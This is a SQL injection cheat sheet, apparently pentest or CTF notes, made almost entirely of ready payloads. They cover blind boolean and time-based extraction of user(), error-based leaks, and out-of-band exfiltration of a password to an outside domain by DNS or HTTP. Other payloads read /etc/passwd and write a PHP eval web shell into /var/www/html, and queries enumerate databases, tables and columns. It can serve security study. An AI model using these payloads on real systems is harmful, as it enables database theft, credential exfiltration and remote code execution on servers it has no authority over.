# SQL Injection
- Type
  > Prevent: Parameterized Query, Prepared Statement

  - Union Based
  - Blind
    - Boolean Based

      ```
      ... id = 1 and length(user()) > 0
      ... id = 1 and length(user()) > 16
      ... id = 1 and ascii(mid(user(),1,1)) > 0
      ... id = 1 and ascii(mid(user(),1,1)) > 80
      ```

    - Time Based
      - sleep

        ```
        ... id = 1 and IF(ascii(mid(user(),1,1))>0, SLEEP(10), 1)
        ... id = 1 and IF(ascii(mid(user(),1,1))>80, SLEEP(10), 1)
        ```

      - query / large calculation data
      - repeat('A', 10000)
  - Error
    - ExtractValue(xml, xpath)

      ```
      SELECT ExtractValue(1, concat(0x0a,version()));
      -----------------------------------------------
      XPATH syntax error:'
      8.0.20'
      ```

    - UpdateXML(xml, xpath, new\_xml)
    - exp(x)
    - MultiLineString(LineString)
    - MultiPolygon(Polygon)
  - Out-of-Band

    | DB              | Payload                                                                 | Comment   |
    |:----------------|:------------------------------------------------------------------------|:----------|
    | MySQL + Windows | `load_file(concat("\\\\", password, ".splitline.tw"))`                  | DNS Query |
    |                 | SMB + DNS query log ([DNSBin](https://github.com/ettic-team/dnsbin))    |           |
    | Oracle          | `url_http.request('http://splitline.tw/' \|\| (SELECT user FROM dual))` |           |

  - Multi Byte SQL Injection
- Read / Write File
  - `SELECT LOAD_FILE('/etc/passwd')` (MySQL)
  - `SELECT pg_read_file('/etc/passwd', <offset>, <length>)` (PostgresSQL)
  - `SELECT "<?php eval($_GET[x]);?>" INTO OUTFILE "/var/www/html/shell.php"` (MySQL)
- Common Function

  | DB     | Function          |                 |           |            |          |
  |:-------|:------------------|:----------------|:----------|:-----------|:---------|
  | MySQL  | user()            | current\_user() | version() | database() | schema() |
  |        | group\_concat()   |                 |           |            |          |
  | Oracle | url\_http.request |                 |           |            |          |

- Special Table

  | DB           | Payload                                                             | Comment   |
  |:-------------|:--------------------------------------------------------------------|:----------|
  | MySQL >= 5.0 | `SELECT schema_name FROM information_schema.schemata;`               | Databases |
  |              | `SELECT table_name FROM information_schema.tables WHERE table_schema = '<database>';`                  | Tables    |
  |              | `SELECT group_concat(column_name) FROM information_schema.columns WHERE table_schema = '<database>' AND table_name = '<table>'`  | Columns   |
